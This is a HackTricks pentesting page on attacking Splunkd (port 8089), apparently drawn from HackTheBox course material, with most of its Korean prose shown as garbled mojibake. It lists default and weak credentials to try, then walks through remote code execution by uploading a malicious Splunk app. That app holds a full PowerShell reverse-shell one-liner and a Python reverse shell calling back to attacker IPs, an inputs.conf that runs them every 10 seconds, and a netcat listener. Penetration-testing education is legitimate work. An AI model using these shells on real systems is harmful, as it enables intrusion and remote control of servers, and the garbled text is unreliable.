# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **ê¸°ë³¸ ì •ë³´**

SplunkëŠ” **ë°ì´í„° ìˆ˜ì§‘, ë¶„ì„ ë° ì‹œê°í™”**ì—ì„œ ì¤‘ìš”í•œ ì—­í• ì„ í•˜ëŠ” **ë¡œê·¸ ë¶„ì„ ë„êµ¬**ì…ë‹ˆë‹¤. ì´ˆê¸° ëª©ì ì€ **SIEM(ë³´ì•ˆ ì •ë³´ ë° ì´ë²¤íŠ¸ ê´€ë¦¬)** ë„êµ¬ë¡œ ì‚¬ìš©ë˜ëŠ” ê²ƒì´ ì•„ë‹ˆì—ˆì§€ë§Œ, **ë³´ì•ˆ ëª¨ë‹ˆí„°ë§** ë° **ë¹„ì¦ˆë‹ˆìŠ¤ ë¶„ì„** ë¶„ì•¼ì—ì„œ ì¸ê¸°ë¥¼ ì–»ì—ˆìŠµë‹ˆë‹¤.

Splunk ë°°í¬ëŠ” ì¢…ì¢… **ë¯¼ê°í•œ ë°ì´í„°**ë¥¼ ì €ì¥í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì‹œìŠ¤í…œì„ ì¹¨í•´í•  ê²½ìš° ì ì¬ì ì¸ ê³µê²©ìì—ê²Œ **ê·€ì¤‘í•œ ì •ë³´ ì¶œì²˜**ê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ê¸°ë³¸ í¬íŠ¸:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
ê¸°ë³¸ì ìœ¼ë¡œ **Splunk ì›¹ ì„œë²„ëŠ” í¬íŠ¸ 8000ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤**.
{% endhint %}

## ì—´ê±°

### ë¬´ë£Œ ë²„ì „

Splunk Enterprise ì²´í—˜íŒì€ **60ì¼ í›„ ë¬´ë£Œ ë²„ì „ìœ¼ë¡œ ì „í™˜ë˜ë©°**, **ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ Splunkì˜ ì²´í—˜íŒì„ ì„¤ì¹˜í•˜ì—¬ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì€ ë“œë¬¸ ì¼ì´ ì•„ë‹ˆë©°, ì´ëŠ” **ê·¸ í›„ ìŠí˜€ì§€ê³¤ í•©ë‹ˆë‹¤**. ì´ëŠ” ì¸ì¦ì´ ì „í˜€ ì—†ëŠ” ë¬´ë£Œ ë²„ì „ìœ¼ë¡œ ìë™ ì „í™˜ë˜ì–´ í™˜ê²½ì— ë³´ì•ˆ êµ¬ë©ì„ ì´ˆë˜í•©ë‹ˆë‹¤. ì¼ë¶€ ì¡°ì§ì€ ì˜ˆì‚° ì œì•½ìœ¼ë¡œ ì¸í•´ ë¬´ë£Œ ë²„ì „ì„ ì„ íƒí•  ìˆ˜ ìˆìœ¼ë©°, ì‚¬ìš©ì/ì—­í•  ê´€ë¦¬ê°€ ì—†ë‹¤ëŠ” ê²ƒì˜ ì˜ë¯¸ë¥¼ ì™„ì „íˆ ì´í•´í•˜ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê¸°ë³¸ ìê²© ì¦ëª…

êµ¬ë²„ì „ì˜ Splunkì—ì„œëŠ” ê¸°ë³¸ ìê²© ì¦ëª…ì´ **`admin:changeme`**ë¡œ, ë¡œê·¸ì¸ í˜ì´ì§€ì— í¸ë¦¬í•˜ê²Œ í‘œì‹œë©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ **ìµœì‹  ë²„ì „ì˜ Splunk**ëŠ” **ì„¤ì¹˜ ê³¼ì • ì¤‘ì— ìê²© ì¦ëª…ì„ ì„¤ì •í•©ë‹ˆë‹¤**. ê¸°ë³¸ ìê²© ì¦ëª…ì´ ì‘ë™í•˜ì§€ ì•ŠëŠ” ê²½ìš°, `admin`, `Welcome`, `Welcome1`, `Password123`ì™€ ê°™ì€ ì¼ë°˜ì ì¸ ì•½í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í™•ì¸í•´ ë³¼ ê°€ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤.

### ì •ë³´ ì–»ê¸°

Splunkì— ë¡œê·¸ì¸í•˜ë©´ **ë°ì´í„°ë¥¼ íƒìƒ‰í•˜ê³ **, **ë³´ê³ ì„œë¥¼ ì‹¤í–‰í•˜ë©°**, **ëŒ€ì‹œë³´ë“œë¥¼ ìƒì„±í•˜ê³ **, Splunkbase ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ **ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜**í•˜ê³ , ì‚¬ìš©ì ì •ì˜ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤: SplunkëŠ” ì„œë²„ ì¸¡ Django ì• í”Œë¦¬ì¼€ì´ì…˜, REST ì—”ë“œí¬ì¸íŠ¸, ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ ë° ê²½ê³  ìŠ¤í¬ë¦½íŠ¸ì™€ ê°™ì€ ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ìœ¼ë¡œ **ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Splunk ì„œë²„ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ì–»ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë˜í•œ, SplunkëŠ” Windows ë˜ëŠ” Linux í˜¸ìŠ¤íŠ¸ì— ì„¤ì¹˜í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ Bash, PowerShell ë˜ëŠ” Batch ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Shodan

* `Splunk build`

## RCE

### ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ë§Œë“¤ê¸°

ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ **Python, Batch, Bash ë˜ëŠ” PowerShell ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**Splunkì—ëŠ” Pythonì´ ì„¤ì¹˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ**, **Windows** ì‹œìŠ¤í…œì—ì„œë„ Python ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ì›€ì„ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¦¬í¬ì§€í† ë¦¬ì˜ **`bin`** ë””ë ‰í† ë¦¬ì—ëŠ” [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ë° [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) ì˜ˆì œê°€ ìˆìŠµë‹ˆë‹¤. ë‹¨ê³„ë³„ë¡œ ì§„í–‰í•´ ë³´ê² ìŠµë‹ˆë‹¤.

ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´, ë¨¼ì € ë‹¤ìŒ ë””ë ‰í† ë¦¬ êµ¬ì¡°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì •ì˜ Splunk ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
The **`bin`** ë””ë ‰í† ë¦¬ì—ëŠ” ìš°ë¦¬ê°€ ì‹¤í–‰í•  **ìŠ¤í¬ë¦½íŠ¸**ê°€ í¬í•¨ë  ê²ƒì…ë‹ˆë‹¤ (ì´ ê²½ìš° **PowerShell** ë¦¬ë²„ìŠ¤ ì…¸) ë° ê¸°ë³¸ ë””ë ‰í† ë¦¬ì—ëŠ” ìš°ë¦¬ì˜ `inputs.conf` íŒŒì¼ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤. ìš°ë¦¬ì˜ ë¦¬ë²„ìŠ¤ ì…¸ì€ **PowerShell ì›ë¼ì´ë„ˆ**ê°€ ë  ê²ƒì…ë‹ˆë‹¤:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) íŒŒì¼ì€ Splunkì— **ì–´ë–¤ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í• ì§€** ë° ê¸°íƒ€ ì¡°ê±´ì„ ì•Œë ¤ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ ìš°ë¦¬ëŠ” ì•±ì„ í™œì„±í™”ë¡œ ì„¤ì •í•˜ê³  Splunkì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ 10ì´ˆë§ˆë‹¤ ì‹¤í–‰í•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤. ê°„ê²©ì€ í•­ìƒ ì´ˆ ë‹¨ìœ„ì´ë©°, ì´ ì„¤ì •ì´ ì¡´ì¬í•  ê²½ìš°ì—ë§Œ ì…ë ¥(ìŠ¤í¬ë¦½íŠ¸)ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
ìš°ë¦¬ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë°°í¬ë  ë•Œ ì‹¤í–‰ë˜ê³  PowerShell ì›ë¼ì´ë„ˆë¥¼ ì‹¤í–‰í•  `.bat` íŒŒì¼ì´ í•„ìš”í•©ë‹ˆë‹¤.

ë‹¤ìŒ ë‹¨ê³„ëŠ” `Install app from file`ì„ ì„ íƒí•˜ê³  ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì—…ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

ì•…ì„± ì‚¬ìš©ì ì •ì˜ ì•±ì„ ì—…ë¡œë“œí•˜ê¸° ì „ì— Netcat ë˜ëŠ” [socat](https://linux.die.net/man/1/socat)ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ìŠ¤ë„ˆë¥¼ ì‹œì‘í•©ì‹œë‹¤.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`. As **ìš°ë¦¬ê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì—…ë¡œë“œí•˜ëŠ” ì¦‰ì‹œ**, a **ë¦¬ë²„ìŠ¤ ì…¸ì´ ìˆ˜ì‹ ë©ë‹ˆë‹¤** as the status of the application will automatically be switched to `Enabled`.

#### Linux

If we were dealing with a **Linux host**, we would need to **edit the `rev.py` Python script** before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ ì„œë¹„ìŠ¤ë¥¼ ì•…ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê³  ì§€ì†ì„±ì„ ì–»ëŠ” ë°©ë²•ì— ëŒ€í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
